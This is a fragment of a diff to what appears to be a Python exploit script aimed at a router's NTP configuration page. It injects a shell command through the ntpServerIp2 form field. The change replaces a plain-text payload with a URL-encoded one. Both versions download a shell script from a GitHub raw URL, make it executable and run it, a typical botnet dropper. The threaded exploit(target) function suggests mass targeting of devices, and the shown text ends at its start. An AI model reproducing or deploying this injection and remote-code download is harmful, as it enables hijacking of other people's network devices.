@@ -2,8 +2,8 @@ import urllib.request
 import urllib.error
 from threading import Thread
 
+payload = "wget%20https%3A%2F%2Fraw.githubusercontent.com%2F20Matrix77%2FDHJIF%2Frefs%2Fheads%2Fmain%2Fskfnw.sh%3B%20chmod%20777%20%2A%3B%20sh%20skfnw.sh"
 body = "timeZone=3+2&enabled=ON&ntpServerIp1=ca.pool.ntp.org&ntpServerId=1&ntpServerIp2="+payload+"&submit-url=%2Fntp.htm&save_apply=Salvar+%26+Aplicar"
-payload = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/20Matrix77/DHJIF/refs/heads/main/skfnw.sh; chmod 777 *; sh skfnw.sh"
 
 def exploit(target):
     try:
